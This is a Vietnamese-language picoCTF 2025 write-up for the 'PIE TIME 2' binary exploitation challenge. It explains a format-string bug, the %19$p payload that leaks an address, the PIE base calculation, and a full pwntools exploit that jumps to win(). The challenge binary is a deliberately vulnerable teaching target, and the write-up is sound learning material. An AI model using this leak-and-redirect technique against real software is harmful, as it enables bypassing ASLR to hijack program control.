# picoCTF 2025 - PIE TIME 2

## Thông tin bài

- **Tên bài:** PIE TIME 2
- **Chủ đề:** Binary Exploitation
- **Độ khó:** Medium
- **Lỗ hổng chính:** Format String
- **Cơ chế bảo vệ cần vượt qua:** PIE + ASLR

---

## 1. Phân tích mã nguồn

Chương trình có hàm `call_functions()` như sau:

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Hàm `win()` sẽ đọc và in nội dung của `flag.txt`:

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  fptr = fopen("flag.txt", "r");

  if (fptr == NULL) {
    printf("Cannot open file.\n");
    exit(0);
  }

  c = fgetc(fptr);
  while (c != EOF) {
    printf("%c", c);
    c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}
```

Mục tiêu là tìm địa chỉ thực tế của `win()` khi chương trình đang chạy, rồi nhập địa chỉ đó vào biến `val`.

---

## 2. Lỗ hổng Format String

Dòng sau bị lỗi:

```c
printf(buffer);
```

Dữ liệu người dùng được truyền trực tiếp làm chuỗi định dạng cho `printf()`.

Cách viết an toàn phải là:

```c
printf("%s", buffer);
```

Do lỗi này, ta có thể nhập các định dạng như:

```text
%p
```

hoặc:

```text
%19$p
```

để đọc các giá trị đang nằm trong thanh ghi hoặc trên stack.

Mục tiêu là làm lộ một địa chỉ nằm bên trong binary.

---

## 3. Tại sao cần leak địa chỉ?

Binary bật PIE, vì vậy địa chỉ nạp chương trình thay đổi ở mỗi lần chạy do ASLR.

Kết quả từ `nm` chỉ cho ta offset của hàm trong file, không phải địa chỉ thật khi chương trình đang chạy.

Công thức:

```text
địa chỉ thật của hàm = PIE base + offset của hàm
```

Do đó cần:

1. Leak một địa chỉ nằm trong binary.
2. Xác định offset của địa chỉ bị leak.
3. Tính PIE base.
4. Cộng PIE base với offset của `win()`.

---

## 4. Tìm offset của hàm `win`

Dùng lệnh:

```bash
nm ./vuln | grep " win"
```

Kết quả:

```text
000000000000136a T win
```

Vậy:

```text
offset win = 0x136a
```

---

## 5. Tìm return address trên stack

Dùng `objdump` để xem hàm `main`:

```bash
objdump -d ./vuln | grep -A40 "<main>"
```

Phần quan trọng:

```asm
143c: e8 86 fe ff ff        call   12c7 <call_functions>
1441: b8 00 00 00 00        mov    $0x0,%eax
```

Khi CPU thực hiện:

```asm
call call_functions
```

địa chỉ của lệnh ngay sau `call` được đẩy lên stack làm return address.

Ở đây return address có offset:

```text
0x1441
```

Khi `call_functions()` kết thúc bằng `ret`, CPU lấy địa chỉ này từ stack và đưa vào thanh ghi `RIP` để quay về `main`.

---

## 6. Dò vị trí của return address bằng Format String

Thử lần lượt các vị trí trên stack:

```text
%1$p
%2$p
%3$p
...
```

Có thể chia thành các nhóm ngắn để không vượt quá giới hạn 63 byte của `fgets()`:

```text
%1$p|%2$p|%3$p|%4$p|%5$p
```

```text
%6$p|%7$p|%8$p|%9$p|%10$p
```

```text
%11$p|%12$p|%13$p|%14$p
```

```text
%15$p|%16$p|%17$p|%18$p
```

```text
%19$p|%20$p|%21$p|%22$p
```

Kết quả cho thấy `%19$p` làm lộ return address:

```text
Enter your name:%19$p
0x555555555441
```

Ta thấy địa chỉ này kết thúc bằng `0x1441`, đúng với offset của lệnh ngay sau `call call_functions`.

---

## 7. Xác nhận PIE base bằng GDB

Chạy chương trình trong GDB:

```bash
gdb -q ./vuln
```

Sau đó:

```gdb
run
```

Nhập:

```text
%19$p
```

Khi chương trình in leak, kiểm tra vùng nhớ:

```gdb
info proc mappings
```

Kết quả cho thấy binary bắt đầu tại:

```text
0x555555554000
```

Đây là PIE base.

Ta cũng có thể tính từ địa chỉ leak:

```text
PIE base = leak - offset leak
```

Thay số:

```text
PIE base = 0x555555555441 - 0x1441
         = 0x555555554000
```

Kết quả khớp với `info proc mappings`.

---

## 8. Tính địa chỉ thật của `win`

Ta đã có:

```text
PIE base  = 0x555555554000
offset win = 0x136a
```

Do đó:

```text
win = PIE base + offset win
    = 0x555555554000 + 0x136a
    = 0x55555555536a
```

Có thể tính trực tiếp từ leak:

```text
win = leak - 0x1441 + 0x136a
```

Rút gọn:

```text
win = leak - 0xd7
```

Với leak:

```text
0x555555555441
```

Ta được:

```text
0x555555555441 - 0xd7 = 0x55555555536a
```

---

## 9. Khai thác thủ công

Chạy chương trình:

```bash
./vuln
```

Nhập payload leak:

```text
%19$p
```

Ví dụ chương trình trả về:

```text
0x555555555441
```

Tính địa chỉ `win`:

```text
0x555555555441 - 0xd7 = 0x55555555536a
```

Khi chương trình hỏi:

```text
enter the address to jump to, ex => 0x12345:
```

nhập:

```text
0x55555555536a
```

Chương trình sẽ gọi trực tiếp hàm `win()` và in flag.

Lưu ý: phải leak và nhập địa chỉ `win` trong cùng một lần chạy vì PIE base thay đổi sau mỗi lần khởi động chương trình.

---

## 10. Exploit bằng pwntools

```python
from pwn import *
import re

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote("HOST", PORT)
    return process(elf.path)


p = start()

# Leak return address của call_functions
p.sendlineafter(b"Enter your name:", b"%19$p")

output = p.recvuntil(b"ex => 0x12345: ")

match = re.search(rb"0x[0-9a-fA-F]+", output)
if match is None:
    log.failure("Không tìm thấy địa chỉ leak")
    p.close()
    exit()

leak = int(match.group(), 16)

# Return address có offset 0x1441
pie_base = leak - 0x1441

# Hàm win có offset 0x136a
win_address = pie_base + 0x136a

log.success(f"Leak:     {hex(leak)}")
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"win:      {hex(win_address)}")

# scanf("%lx") nhận địa chỉ dưới dạng chuỗi hexadecimal
p.sendline(hex(win_address).encode())

p.interactive()
```

Khi chạy remote, thay:

```python
return remote("HOST", PORT)
```

bằng host và port của instance.

Chạy:

```bash
python3 exploit.py REMOTE
```

---

## 11. Tổng kết

Chuỗi khai thác của bài:

```text
Format String
    ↓
Dùng %19$p leak return address
    ↓
Return address có offset 0x1441
    ↓
PIE base = leak - 0x1441
    ↓
win = PIE base + 0x136a
    ↓
Nhập địa chỉ win vào scanf
    ↓
Chương trình gọi win() và in flag
```

Điểm quan trọng của bài là không cần ghi đè return address bằng buffer overflow. Chương trình đã cho phép người dùng nhập một địa chỉ rồi gọi trực tiếp địa chỉ đó thông qua function pointer:

```c
void (*foo)(void) = (void (*)())val;
foo();
```

Vấn đề duy nhất là PIE làm địa chỉ `win()` thay đổi. Format String được dùng để leak một địa chỉ trong binary, từ đó tính lại địa chỉ chính xác của `win()`.
